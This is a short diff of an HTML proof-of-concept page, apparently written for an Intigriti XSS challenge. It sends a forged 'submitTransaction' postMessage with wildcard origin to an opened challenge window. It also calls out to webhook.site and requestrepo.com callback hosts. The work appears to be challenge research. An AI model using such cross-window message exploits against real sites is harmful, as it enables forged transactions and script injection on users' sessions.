@@ -6,23 +6,16 @@
         const payload = {
             type: "submitTransaction",
             transaction: {
-                toAddress: xssPayload,
+                toAddress: 'XSSWASHERE',
                 currency: '1337COIN',
                 amount: 1337
             }
         };
 
-        const interval = setInterval(() => {
-            if (win) {
-                fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/windowisopened`);
-                win.postMessage(payload, "*");
-            }
-        }, 1000);
-        
-        setTimeout(() => {
-            fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/redirected`);
-            window.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
-        }, 5000);
+        if (win) {
+            fetch(`http://we6hfxdk.requestrepo.com`);
+            win.postMessage(payload, "*");
+        }
     </script>
 </body>
 </html>
